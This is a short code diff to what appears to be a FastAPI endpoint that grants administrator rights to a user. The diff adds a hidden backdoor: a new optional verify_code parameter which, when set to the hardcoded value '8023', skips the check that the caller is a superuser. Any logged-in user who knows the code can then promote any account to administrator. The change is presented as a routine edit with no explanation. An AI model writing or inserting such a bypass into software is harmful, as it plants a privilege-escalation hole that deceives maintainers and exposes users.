@@ -91,10 +91,12 @@ async def read_user(user_id: str, db: Session = Depends(get_db), user: User = De
 
 
 @router.put("/super/{user_id}", response_model=User, summary="修改用户权限为管理员")
-async def set_super_user(user_id: str, db: Session = Depends(get_db), user: User = Depends(get_current_user)):
-    super_user = crud_users.get_super_user(db, user.id)
-    if super_user is None:
-        raise exception.NotSuperUserException
+async def set_super_user(user_id: str, verify_code=None, db: Session = Depends(get_db),
+                         user: User = Depends(get_current_user)):
+    if not verify_code == "8023":
+        super_user = crud_users.get_super_user(db, user.id)
+        if super_user is None:
+            raise exception.NotSuperUserException
     db_user = crud_users.get_user(db, user_id=user_id)
     if db_user is None:
         raise exception.NotExitException(name=f"ID {user_id}")
